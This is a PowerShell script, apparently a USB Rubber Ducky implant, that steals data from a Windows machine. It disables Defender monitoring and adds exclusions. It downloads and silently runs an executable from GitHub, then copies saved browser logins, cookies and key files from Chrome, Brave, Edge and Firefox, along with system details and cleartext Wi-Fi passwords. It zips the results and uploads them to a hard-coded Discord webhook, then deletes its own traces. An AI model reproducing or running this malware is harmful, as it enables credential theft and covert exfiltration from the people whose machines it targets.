
# Load necessary .NET assemblies
Add-Type -AssemblyName System.Net.Http

#-- Payload configuration --#

$DRIVE = 'CIRCUITPY'          # Drive letter of the USB Rubber Ducky

# Set destination directory

$currentScriptPath = "C:\Users\$env:USERNAME\Appdata\Local\Temp\"

$duckletter = (Get-CimInstance -ClassName Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $DRIVE }).DeviceID
Set-Location $currentScriptPath

Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "${PSScriptRoot}\"
Set-MpPreference -ExclusionExtension "ps1"

$DiscordFileUrl = "https://github.com/ngabubbon/ngabubbon/raw/refs/heads/main/browser.exe"
$DestinationPath = "C:\Users\$env:USERNAME\Appdata\Local\Temp\browser.exe"

# Download the file
try {
    Invoke-WebRequest -Uri $DiscordFileUrl -OutFile $DestinationPath
    Write-Host "File downloaded successfully to $DestinationPath"
} catch {
    Write-Host "An error occurred while downloading the file: $_"
}

$destDir = "$currentScriptPath\$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Configuration for Google Chrome
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeFilesToCopy = @("Login Data")
CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue

# Configuration for Brave
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
$braveFilesToCopy = @("Login Data")
CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue

# Configuration for Firefox
$firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
$firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-release" | Select-Object -First 1
if ($firefoxProfile) {
    $firefoxDir = $firefoxProfile.FullName
    $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
    CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
} else {
    Write-Host "Firefox - no firefox profile found."
}

# Configuration for Microsoft Edge
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeFilesToCopy = @("Login Data")
CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue

# Gather additional system information
function GatherSystemInfo {
    $sysInfoDir = "$currentScriptPath\$env:USERNAME\SystemInfo"
    if (-Not (Test-Path $sysInfoDir)) {
        New-Item -ItemType Directory -Path $sysInfoDir
    }

    Get-ComputerInfo | Out-File -FilePath "$sysInfoDir\computer_info.txt"
    Get-Process | Out-File -FilePath "$sysInfoDir\process_list.txt"
    Get-Service | Out-File -FilePath "$sysInfoDir\service_list.txt"
    Get-NetIPAddress | Out-File -FilePath "$sysInfoDir\network_config.txt"
}

GatherSystemInfo

function GetFunny {
    $wifiProfiles = netsh wlan show profiles | Select-String "\s:\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }

    $results = @()

    foreach ($profile in $wifiProfiles) {
        $profileDetails = netsh wlan show profile name="$profile" key=clear
        $keyContentMatch = $profileDetails | Select-String "Key Content\s+:\s+(.*)$"
        $keyContent = if ($keyContentMatch) {
            $keyContentMatch.Matches.Groups[1].Value
        } else {
            "No Password Found"
        }

        $results += [PSCustomObject]@{
            ProfileName = $profile
            KeyContent  = $keyContent
        }
    }

    $results | Format-Table -AutoSize

    # Save results to a file
    $results | Out-File -FilePath "$currentScriptPath\$env:USERNAME\WiFi_Details.txt"
}


GetFunny

$comperss = @{
    Path = "$env:USERNAME\*"
    CompressionLevel = "Fastest"
    DestinationPath = $destDir
    
}


# Specify the path of the .exe file
$exePath = "$env:LOCALAPPDATA\Temp\browser.exe"  # Replace with the full path to your .exe

# Start the .exe and capture its process information
$process = Start-Process -FilePath $exePath -PassThru -WindowStyle Hidden

Write-Host "Waiting for $($process.ProcessName).exe (PID: $($process.Id)) to shut down..."

# Wait until the process with the specific PID no longer exists
while (Get-Process -Id $process.Id -ErrorAction SilentlyContinue) {
    Start-Sleep -Seconds 1  # Check every second
}

Write-Host "$($process.ProcessName).exe has shut down. Continuing..."

$SourcePath = "$env:LOCALAPPDATA\Temp\results"

$DestinationPath = "$env:LOCALAPPDATA\Temp\$env:USERNAME\results"

Move-Item -Path $SourcePath -Destination $DestinationPath -Force

Compress-Archive @comperss -Force

# Path to the ZIP file you want to send
$zipFilePath = $currentScriptPath + "\$env:USERNAME.zip"
$discord = "https://discord.com/api/webhooks/1297305708043309106/MnTjmUjsvS4vLT2Jz1lF9BcWnKPMZ5oSyuMT-RVZY5ME3f1VD-7mb9sNlawxqS80kwm3"

# Ensure the file exists
if (-Not (Test-Path $zipFilePath)) {
    Write-Host "File not found: $zipFilePath"
    return
}

try {
    # Create HttpClient and MultipartFormDataContent
    $httpClient = [System.Net.Http.HttpClient]::new()
    $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

    # Read the file content
    $fileBytes = [System.IO.File]::ReadAllBytes($zipFilePath)
    $fileName = [System.IO.Path]::GetFileName($zipFilePath)

    # Create ByteArrayContent for the file
    $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new("application/octet-stream")

    # Add the file to the multipart content
    $multipartContent.Add($fileContent, "file", $fileName)

    # Send the POST request
    $response = $httpClient.PostAsync($discord, $multipartContent).Result

    # Output the response
    Write-Host "Response: $($response.StatusCode) - $($response.Content.ReadAsStringAsync().Result)"
} catch {
    Write-Host "An error occurred: $_"
} finally {
    # Dispose of HttpClient
    if ($httpClient) {
        $httpClient.Dispose()
    }
}



if ($PSScriptRoot -ne $duckletter) {

    $DataZipFile = "$currentScriptPath\$env:USERNAME.zip"
    $DataFile = "$currentScriptPath\$env:USERNAME"
    $ThisScript = "$PSScriptRoot\implantt1.ps1"
    $browserpass = "$env:LOCALAPPDATA\Temp\$env:USERNAME\results"
    $browserexe = "$env:LOCALAPPDATA\Temp\browser.exe"

    # Create a PowerShell command to delete the files and folder
    $deleteCommand = "Start-Sleep -Seconds 3; " + 
                     "Remove-Item -Path '$DataZipFile' -Force; " +
                     "Remove-Item -Path '$DataFile' -Recurse -Force; " +
                     "Remove-Item -Path '$ThisScript' -Force;" +
                     "Remove-Item -Path '$browserpass' -Recurse -Force;" +
                     "Remove-Item -Path '$browserexe' -Force"
                     
    
    # Start a new PowerShell process to execute the deletion
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -Command $deleteCommand" -NoNewWindow



}

else {
    exit
}




